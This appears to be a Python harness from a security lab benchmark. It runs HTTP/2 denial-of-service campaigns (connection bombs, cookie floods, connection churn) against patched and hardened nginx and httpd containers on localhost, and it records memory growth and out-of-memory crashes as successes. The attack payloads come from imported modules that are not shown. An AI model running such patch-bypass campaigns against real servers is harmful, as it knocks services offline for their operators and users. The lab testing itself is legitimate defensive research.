#!/usr/bin/env python3
"""Patch-bypass campaign — test gepatchte Stacks mit angepassten Profilen."""
from __future__ import annotations

import argparse
import json
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

BENCH = Path(__file__).resolve().parent

try:
    from benchmark.attack_config import (
        CookieAttackConfig,
        profile_apex_cookie_scaled,
        profile_patch_bypass_httpd_fat,
        profile_patch_bypass_nginx,
        profile_patch_bypass_nginx_hardened,
    )
    from benchmark.attack_runner import run_attack, run_cookie_attack
    from benchmark.campaigns import run_churn, run_multiprocess
except ModuleNotFoundError:
    # Fallback when script is executed from inside benchmark/.
    from attack_config import (
        CookieAttackConfig,
        profile_apex_cookie_scaled,
        profile_patch_bypass_httpd_fat,
        profile_patch_bypass_nginx,
        profile_patch_bypass_nginx_hardened,
    )
    from attack_runner import run_attack, run_cookie_attack
    from campaigns import run_churn, run_multiprocess

DEFAULT_LOG_ROOT = BENCH.parent / "lab-replay" / "logs"


def container_rss(container: str) -> int:
    cmd = [
        "docker", "exec", container, "bash", "-c",
        "t=0;for p in $(pgrep -f 'nginx: worker|httpd' 2>/dev/null);do "
        "r=$(awk '/VmRSS/{print $2}' /proc/$p/status 2>/dev/null);t=$((t+r));done;echo $((t/1024))",
    ]
    try:
        return int(subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True).strip() or "0")
    except (subprocess.CalledProcessError, ValueError):
        return 0


def container_mem(container: str) -> str:
    try:
        return subprocess.check_output(
            ["docker", "stats", container, "--no-stream", "--format", "{{.MemUsage}}"],
            text=True,
        ).strip()
    except subprocess.CalledProcessError:
        return "n/a"


def run_test(name: str, container: str, fn) -> dict:
    print(f"\n{'='*60}\n>>> {name}\n{'='*60}")
    rss_before = container_rss(container)
    mem_before = container_mem(container)
    t0 = time.monotonic()
    result = fn()
    elapsed = time.monotonic() - t0
    rss_after = container_rss(container)
    mem_after = container_mem(container)
    summary = {
        "test": name,
        "elapsed_sec": round(elapsed, 1),
        "rss_before_mib": rss_before,
        "rss_after_mib": rss_after,
        "rss_delta_mib": rss_after - rss_before,
        "container_mem_before": mem_before,
        "container_mem_after": mem_after,
    }
    if result:
        summary.update({
            "run_id": result.run_id,
            "strategy": result.strategy,
            "connections_bomb_ok": f"{result.connections_bomb_ok}/{result.connections_requested}",
            "wire_mb": result.wire_mb,
            "server_down": result.server_down,
            "oom_likely": result.oom_likely,
            "probe_before": result.probe_before.http_code,
            "probe_after": result.probe_after.http_code,
        })
    print(json.dumps(summary, indent=2))
    return summary


def run_nginx_campaign(port: int, container: str, log_dir: Path, hardened: bool = False) -> list[dict]:
    results: list[dict] = []
    host = "127.0.0.1"
    tag = "hardened" if hardened else "patched"
    cfg_fn = profile_patch_bypass_nginx_hardened if hardened else profile_patch_bypass_nginx
    hdr = 99 if hardened else 999
    conn_scale = [50, 100] if hardened else [200, 300, 500]

    subprocess.run(["docker", "restart", container], check=False, capture_output=True)
    time.sleep(3)

    cfg = cfg_fn(hdr)
    results.append(run_test(
        f"nginx_{tag}_{hdr}hdr_{conn_scale[0]}conn",
        container,
        lambda c=conn_scale[0], cfg=cfg: run_attack(
            f"patch_bypass_{tag}", host, port, c, cfg=cfg, variant="nginx",
        ),
    ))

    if not hardened:
        subprocess.run(["docker", "restart", container], check=False, capture_output=True)
        time.sleep(3)
        cfg_mp = cfg_fn(hdr)
        results.append(run_test(
            f"nginx_{tag}_{hdr}hdr_apex_mp_300conn",
            container,
            lambda: run_multiprocess(
                host, 300, port=port, cfg=cfg_mp,
                strategy="patch_bypass_mp_300", variant="nginx",
            ),
        ))

        subprocess.run(["docker", "restart", container], check=False, capture_output=True)
        time.sleep(3)
        results.append(run_test(
            f"nginx_{tag}_{hdr}hdr_{conn_scale[-1]}conn",
            container,
            lambda: run_attack(
                f"patch_bypass_{tag}_500", host, port, conn_scale[-1], cfg=cfg, variant="nginx",
            ),
        ))

        subprocess.run(["docker", "restart", container], check=False, capture_output=True)
        time.sleep(3)

        def _churn():
            run_churn(host, cycles=15, connections=60, port=port)
            return None

        results.append(run_test(f"nginx_{tag}_churn_15x60", container, _churn))

    out = log_dir / f"nginx_{tag}_results.json"
    out.write_text(json.dumps(results, indent=2), encoding="utf-8")
    return results


def run_httpd_campaign(log_dir: Path) -> list[dict]:
    results: list[dict] = []
    host, port, container = "127.0.0.1", 10080, "httpd-h2-lab-replay"

    subprocess.run(["docker", "restart", container], check=False, capture_output=True)
    time.sleep(3)

    cfg_cookie = profile_apex_cookie_scaled("httpd", 44)
    results.append(run_test(
        "httpd_patched_cookie_44conn",
        container,
        lambda: run_cookie_attack("patch_cookie", host, port, 44, cfg_cookie, variant_id="httpd"),
    ))

    subprocess.run(["docker", "restart", container], check=False, capture_output=True)
    time.sleep(3)

    results.append(run_test(
        "httpd_patched_fat_cookie_500conn",
        container,
        lambda: run_cookie_attack(
            "patch_fat", host, port, 500,
            profile_patch_bypass_httpd_fat(500), variant_id="httpd",
        ),
    ))

    subprocess.run(["docker", "restart", container], check=False, capture_output=True)
    time.sleep(3)

    cfg_min = CookieAttackConfig(
        variant="httpd", streams=4, refs=500, hold=120, drip=10,
        hold_mode="hard_hold", bomb_mode="batched", bomb_batch_size=20,
    )
    results.append(run_test(
        "httpd_patched_cookie_minrefs_200conn",
        container,
        lambda: run_cookie_attack("patch_cookie_min", host, port, 200, cfg_min, variant_id="httpd"),
    ))

    out = log_dir / "httpd_results.json"
    out.write_text(json.dumps(results, indent=2), encoding="utf-8")
    return results


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--target",
        choices=["nginx", "nginx-hardened", "httpd", "all"],
        default="all",
    )
    parser.add_argument("--log-dir", type=Path, default=None)
    args = parser.parse_args()

    stamp = datetime.now(timezone.utc).strftime("%Y%m%d")
    log_dir = args.log_dir or (DEFAULT_LOG_ROOT / f"patch_bypass_{stamp}")
    log_dir.mkdir(parents=True, exist_ok=True)

    results: list[dict] = []

    if args.target in ("nginx", "all"):
        results.extend(run_nginx_campaign(8445, "nginx-h2-patched-lab", log_dir, hardened=False))

    if args.target in ("nginx-hardened", "all"):
        results.extend(run_nginx_campaign(8446, "nginx-h2-hardened-lab", log_dir, hardened=True))

    if args.target in ("httpd", "all"):
        results.extend(run_httpd_campaign(log_dir))

    out = log_dir / "patch_bypass_results.json"
    out.write_text(json.dumps(results, indent=2), encoding="utf-8")
    print(f"\n=== Results written to {out} ===")
    successes = [r for r in results if r.get("oom_likely") or (r.get("rss_delta_mib", 0) > 3000)]
    print(f"OOM/degradation hits: {len(successes)}/{len(results)}")
    for s in successes:
        print(f"  ✓ {s['test']}: RSS +{s.get('rss_delta_mib', 0)} MiB, oom={s.get('oom_likely')}")


if __name__ == "__main__":
    main()
